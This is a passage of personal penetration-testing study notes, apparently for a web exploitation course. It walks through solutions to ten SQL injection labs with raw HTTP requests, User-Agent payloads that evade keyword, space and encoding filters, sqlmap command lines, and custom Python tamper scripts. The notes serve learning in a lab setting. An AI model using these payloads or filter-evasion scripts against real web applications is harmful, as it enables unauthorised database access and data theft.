+</code></pre><p id="6cf6ee74-e63f-4071-8f1a-0b3fe8a0b32a" class="">Downsides:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7beeec87-6b08-46b7-bd4e-f11c0390fc74" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">sqlmap (2nd order) works only GET to GET i.e. we beed a python plugin
+burp needs a java plugin
+</code></pre><p id="454ab186-eff7-4353-b563-2013469292f2" class="">Upsides:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="361c6e8c-8be5-4e79-bf62-60c9f6bc303b" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">out php script
+
+1. GETs the payload in input
+2. Generates the respective image payload (POST req)
+3. Generates the respective GET req, to view page and reflect the result client-side
+</code></pre><ul id="82316d1f-3bb8-426c-9361-46299cc3c106" class="bulleted-list"><li style="list-style-type:disc">So we create a php page, opened with apache2 server to execute payloads</li></ul><p id="1d3a4814-b19f-4bb9-99b9-8581b24c3472" class="">Example:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d460b4a1-e5e3-47a1-9e66-c736ef54523e" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">hacker.site/payload.php?payload=&#x27;UNION SELECT USER(); -- -
+</code></pre><p id="4b47f888-abeb-40ba-a485-8c28cc11e0d6" class="">Finish the job with SQLMAP</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="75cea755-da7c-4285-bd64-57ef424642ba" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">sqlmap -u &#x27;http://hacker.site/payload.php?payload=x&#x27; --technique=U --banner
+
+--flush-session --batch --banner
+# test the time difference between Time-based and Union-based
+# Time 0 is 3min long, Union is 2sec
+</code></pre><p id="6d135c6f-585c-4892-9a54-68fe2742aaa7" class="">We need to pre-elaborate the form before submitting the request.</p><h2 id="f9c1f292-491e-4b5c-9cc5-c78d8ea0a1ae" class=""><strong>Lab Solutions</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#lab-solutions"></a></strong></h2><h3 id="23de5302-b62a-4eeb-8c0a-541b78da1e87" class=""><strong>SQLi 1</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#sqli-1"></a></strong></h3><p id="e40072ef-48a8-439d-9dff-fbcafd6a0fed" class="">PoC:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9452b34d-cda9-43cb-b697-5c51ee029943" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">GET / HTTP/1.1
+Host: 1.sqli.labs
+User-Agent: &#x27; UNION SELECT user(); -- -
+</code></pre><p id="1fa97b16-c725-41a6-9463-0009657531c5" class="">SQLMap Automation:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="39a883c1-6de0-448b-bee7-898c792e72fe" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">sqlmap -u &#x27;http://1.sqli.labs/&#x27; -p user-agent --random-agent --banner
+</code></pre><h3 id="efb53b4e-51a5-41b9-b147-8e5248080c37" class=""><strong>SQLi 2</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#sqli-2"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a0208f98-ae9c-4890-b9ad-b1bc455df9fe" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">UNION and standard payloads like 1=&#x27;1 are filterer.
+
+PoC, False Blind:
+GET / HTTP/1.1
+Host: 2.sqli.labs
+User-Agent: &#x27; or &#x27;elscustom&#x27;=&#x27;elsFALSE
+
+
+PoC, True Blind:
+GET / HTTP/1.1
+Host: 2.sqli.labs
+User-Agent: &#x27; or &#x27;elscustom&#x27;=&#x27;elscustom
+
+
+# SQLMap Automation:
+sqlmap -u &#x27;http://2.sqli.labs/&#x27; -p user-agent --user-agent=elsagent --technique=B --banner
+</code></pre><h3 id="798cc6ba-d4ea-4b15-a373-b048a5ea1862" class=""><strong>SQLi 3</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#sqli-3"></a></strong></h3><p id="5706496d-122c-4fea-a0a8-c4eca232c41b" class="">Spaces are filtered.</p><p id="864517d9-984b-4294-a2a1-b250dc7ec825" class="">PoC:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="21a7572c-ab1d-4c8e-9b28-da55e5212924" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">GET / HTTP/1.1
+Host: 3.sqli.labs
+User-Agent: &#x27;/**/UNION/**/SELECT/**/@@version;#
+
+# SQLMap Automation:
+sqlmap -u &#x27;http://3.sqli.labs/&#x27; -p user-agent --random-agent --technique=U --tamper=space2comment --suffix=&#x27;;#&#x27; --union-char=els --banner
+</code></pre><h3 id="ba9e68fa-3bcd-4975-a917-8d9197189d06" class=""><strong>SQLi 4</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#sqli-4"></a></strong></h3><p id="84020cf0-7ddf-4844-bb91-88ddd4341869" class="">Comments non longer work.</p><p id="2e6dc2b7-d7e3-4455-9df4-7c83803a8623" class="">PoC:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ab45d726-baec-4f72-a3ae-d6ddb7a7ae41" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">GET / HTTP/1.1
+Host: 4.sqli.labs
+User-Agent: &#x27;UNION(select(&#x27;PoC String&#x27;));#
+
+
+# We cannot easily automate this task, as sqlmap should balance the parentesis.
+# To exploit by hand you have to first find the tables in the current database:
+
+
+GET / HTTP/1.1
+Host: 4.sqli.labs
+User-Agent: &#x27;union(SELECT(group_concat(table_name))FROM(information_schema.columns)where(table_schema=database()));#
+
+Then you can enumarate the columns:
+
+GET / HTTP/1.1
+Host: 4.sqli.labs
+User-Agent: &#x27;union(SELECT(group_concat(column_name))FROM(information_schema.columns)where(table_name=&#x27;secretcustomers&#x27;));#
+</code></pre><h3 id="b7911a06-c0dd-457b-905f-6d8592b71f1a" class=""><strong>SQLi 5</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#sqli-5"></a></strong></h3><p id="6e7a3aac-4273-4454-9f21-cb944287f28c" class="">This is similar to SQLi 4, but the developer used doublequotes around strings.</p><p id="e092271d-aaec-4c09-a52c-bd12cc46f941" class="">PoC:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="252b5bb9-2a51-46b5-be88-b72fb705b829" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">GET / HTTP/1.1
+Host: 5.sqli.labs
+User-Agent: &quot;UNION(select(&#x27;PoC String&#x27;));#
+
+# To exploit by hand you have again to find the tables in the current database:
+
+GET / HTTP/1.1
+Host: 5.sqli.labs
+User-Agent: &quot;union(SELECT(group_concat(table_name))FROM(information_schema.columns)where(table_schema=database()));#
+</code></pre><h3 id="b23af295-953b-494e-b055-5871dc3c8724" class=""><strong>SQLi 6</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#sqli-6"></a></strong></h3><p id="123428c1-e6fa-42cd-8b79-e82199f6c604" class="">MySQL’s reserved words have been filtered. Using <strong>RaNDom</strong> case does not help, as you can have, for example, somethin like <em>InfoRMaTIon_ScheMa</em> who will become <em>InfoRMaTI_ScheMa</em>, as <em>on</em> or <em>ON</em> is a valid reserved word.</p><p id="22e10dba-b777-41c4-ab91-ee293b3ae730" class="">PoC:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b0a34793-4dd6-4daf-b69b-f47f0960245e" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">
+GET / HTTP/1.1
+Host: 6.sqli.labs
+User-Agent: &#x27; UNiOn seLect @@versiOn;#
+
+The only way to get around this kind of filtering during the exploitation automation phase is to use DifFeReNt CaSe for every letter
+You have to write a simple tampering script:
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6344e15b-aa49-4885-bd4b-2f840fd71e5b" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">#!/usr/bin/env python
+
+from lib.core.enums import PRIORITY
+
+__priority__ = PRIORITY.NORMAL
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+    &quot;&quot;&quot;
+    Replaces each keyword with a CaMeLcAsE VeRsIoN of it.
+
+    &gt;&gt;&gt; tamper(&#x27;INSERT&#x27;)
+    &#x27;InSeRt&#x27;
+    &quot;&quot;&quot;
+
+    ret_val = &quot;&quot;
+
+    if payload:
+        for i in range(len(payload)):
+            if i % 2 == 0:
+                # We cannot break 0x12345
+                if not ((payload[i] == &#x27;x&#x27;) and (payload[i-1] == &#x27;0&#x27;)):
+                    ret_val += payload[i].upper()
+                else:
+                    ret_val += payload[i]
+            else:
+                ret_val += payload[i].lower()
+    return ret_val
+</code></pre><p id="b6672e18-ca40-494b-8fc2-edfc421313cb" class="">SQLMap command line:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d3a1015f-186d-4e5c-b455-0c149d3aa57b" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">sqlmap -u &#x27;http://6.sqli.labs/&#x27; -p user-agent --technique=U --tamper=/path/to/your/tampering/scripts/camelcase.py --prefix=&quot;nonexistent&#x27;&quot; --suffix=&#x27;;#&#x27; --union-char=els --banner
+</code></pre><h3 id="7d42180c-56ed-4ad1-ab30-7e69d5a30203" class=""><strong>SQLi 7</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#sqli-7"></a></strong></h3><p id="e6a3ec4b-9ece-43be-bc85-23df25c2c6e0" class="">In this scenario, the case-insensitive filter cuts out all the reserved words, but the filter is not recursive.</p><p id="29d8339e-7ddf-4f3e-8f83-926ea2a0de9b" class="">PoC:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4c03dd64-fa10-4e0d-9718-9550807df226" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">GET / HTTP/1.1
+Host: 7.sqli.labs
+User-Agent: &#x27; uZEROFILLnZEROFILLiZEROFILLoZEROFILLnZEROFILL ZEROFILLsZEROFILLeZEROFILLlZEROFILLeZEROFILLcZEROFILLt ZEROFILL@@ZEROFILLvZEROFILLeZEROFILLrZEROFILLsZEROFILLiZEROFILLoZEROFILLnZEROFILL; ZEROFILL-- ZEROFILL-ZEROFILL
+</code></pre><p id="463cc82f-90a0-4bdb-b592-2ca59571a137" class="">Tampering script:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f89cbad1-7335-4e39-ad4f-b7acd5eac82e" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">#!/usr/bin/env python
+
+from lib.core.enums import PRIORITY
+
+__priority__ = PRIORITY.NORMAL
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+    &quot;&quot;&quot;
+    Insert FILL after every character
+
+    &gt;&gt;&gt; tamper(&#x27;INSERT&#x27;)
+    &#x27;IfillNfillSfillEfillRfillTfill
+    &quot;&quot;&quot;
+
+    retVal = str()
+
+    FILL = &#x27;ZEROFILL&#x27;
+
+    if payload:
+        for i in range(len(payload)):
+            retVal += payload[i] + FILL
+    # Uncomment to debug
+    # print &quot;pretamper:&quot;, payload
+    return retVal
+
+</code></pre><p id="42afb88d-eacf-4dd4-90a4-cb99cd10dfcd" class="">SQLMap automation:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="471f8fe9-8da9-4a72-92f7-4ccbb0f921da" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">sqlmap -u &#x27;http://7.sqli.labs/&#x27; -p user-agent --technique=U --tamper=/path/to/your/tampering/scripts/fill.py --banner
+</code></pre><h3 id="395b471c-b8f5-4992-8aec-a4360ccc04b5" class=""><strong>SQLi 8</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#sqli-8"></a></strong></h3><p id="aee8e9fd-e6c6-40f8-b55d-d8a27976529f" class="">Simple URL encoding.</p><p id="28e6d910-a82d-42ea-834e-d21e9a6d180c" class="">PoC:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="efc134b4-be44-44b4-bac1-0ce0f2808ab9" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">GET / HTTP/1.1
+Host: 8.sqli.labs
+User-Agent: %61%61%61%61%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%3b%20%2d%2d%20%2d
+
+SQLMap Automation:
+
+sqlmap -u &#x27;http://8.sqli.labs/&#x27; -p user-agent --tamper=charencode --technique=U --banner
+</code></pre><h3 id="f90822a1-03c7-4123-ac81-cd9db29ee0f8" class=""><strong>SQLi 9</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#sqli-9"></a></strong></h3><p id="08d3d309-758d-4336-9355-9afa4b41853c" class="">Double encoding.</p><p id="e6f5dfb8-0a15-4b4c-8326-764e9983a7c9" class="">PoC:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f7b6ad15-ebb1-4478-bcd0-ef17f554af91" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">GET / HTTP/1.1
+Host: 9.sqli.labs
+User-Agent: %25%36%31%25%36%31%25%36%31%25%36%31%25%32%37%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%34%30%25%34%30%25%37%36%25%36%35%25%37%32%25%37%33%25%36%39%25%36%66%25%36%65%25%33%62%25%32%30%25%32%64%25%32%64%25%32%30%25%32%64
+
+SQLMap Automation:
+
+sqlmap -u &#x27;http://9.sqli.labs/&#x27; -p user-agent --tamper=chardoubleencode --technique=U --banner
+</code></pre><h3 id="6d66188d-5bcd-4c44-90e6-a9916c50f370" class=""><strong>SQLi 10</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#sqli-10"></a></strong></h3><p id="bbe5d8ec-08f1-4ee4-8d94-1a429776393d" class="">This labs combines reserver keyword filtering with an injection in a function.</p><p id="51493580-ffb2-4e0d-82c3-02f4a0f65de7" class="">PoC:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bea720c2-8a0c-4249-b530-4a69f5af6330" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">GET / HTTP/1.1
+Host: 10.sqli.labs
+User-Agent: &#x27;) uZEROFILLnZEROFILLiZEROFILLoZEROFILLn sZEROFILLeZEROFILLlZEROFILLeZEROFILLcZEROFILLt &#x27;PoC&#x27;; -- -
+
+SQLMap Automation:
+
+sqlmap -u &#x27;http://10.sqli.labs/&#x27; -p user-agent --technique=U --tamper=/path/to/your/tampering/scripts/fill.py --prefix=&quot;notexistant&#x27;)&quot; --suffix=&quot;; -- &quot; --union-char=els --banner
+</code></pre><blockquote id="9441a058-fa3a-4653-bac6-8474d086b9e3" class="">[Note] Different sqlmap versions may require different options/flags. For example, regarding level 9:</blockquote><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ee9faf19-fc38-4e2e-9735-67320a1023fb" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">sqlmap -u &#x27;http://9.sqli.labs/&#x27; -p user-agent --tamper=chardoubleencode --technique=U --banner --level=3 --risk=3
+
+or
+
+sqlmap -r 9.sqli.labs.For.sqlmap --banner --tamper=chardoubleencode --dbms mysql --batch --union-char=els  --technique=E
+
+# The only one that worked
+# lvl 10 didnt work either</code></pre></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
